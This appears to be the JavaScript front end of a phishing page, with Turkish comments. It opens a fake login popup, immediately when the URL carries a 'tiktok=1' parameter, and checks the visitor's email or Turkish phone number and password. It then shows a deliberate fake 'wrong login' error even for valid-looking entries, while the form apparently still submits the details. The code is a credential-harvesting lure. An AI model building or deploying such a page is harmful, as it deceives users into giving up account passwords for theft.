document.addEventListener("DOMContentLoaded", () => {
    const urlParams = new URLSearchParams(window.location.search);
    const popup = document.getElementById("message-popup");
    const loginScreen = document.getElementById("login-screen");

    // Eğer URL'de ?tiktok=1 varsa, hemen popup ve login göster
    if (urlParams.get("tiktok") === "1") {
        popup.classList.remove("hidden");
        loginScreen.classList.remove("hidden");

        // Yazıyı da gizle (istiyorsan)
        const messageText = document.querySelector('.popup-content p');
        if (messageText) messageText.style.display = 'none';
        return; // Geri kalan kodu çalıştırma
    }

    // Normalde otomatik gösterim (1 saniye sonra başla)
    setTimeout(() => {
        popup.classList.remove("hidden");

        setTimeout(() => {
            const messageText = document.querySelector('.popup-content p');
            if (messageText) messageText.style.display = 'none';

            loginScreen.classList.remove("hidden");
        }, 3000);
    }, 1000);

    // Form doğrulama kısmı
    const form = document.querySelector('form'); // formu seçiyoruz
    if (form) {
        form.addEventListener('submit', function(e) {

            const emailOrPhone = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value.trim();
            const errorBox = document.getElementById("login-error");

            // E-posta veya telefon geçersizse
            if (!validateEmailOrPhone(emailOrPhone)) {
                errorBox.textContent = "Geçersiz e-posta veya telefon numarası!";
                errorBox.classList.remove("hidden");
                return;
            }

            // Şifre kısa ise
            if (password.length < 6) {
                errorBox.textContent = "Şifre en az 6 karakter olmalıdır!";
                errorBox.classList.remove("hidden");
                return;
            }

            // Doğru gözükse bile sahte hata ver
            errorBox.textContent = "Hatalı giriş. Lütfen tekrar deneyin.";
            errorBox.classList.remove("hidden");
        });
    }

});

// Email ve telefon numarası doğrulama fonksiyonu
function validateEmailOrPhone(input) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const phoneRegex = /^05[0-9]{9}$/;
    const cleanedInput = input.replace(/\s+/g, '').replace(/[()-]/g, '');
    return emailRegex.test(input) || phoneRegex.test(cleanedInput);
}
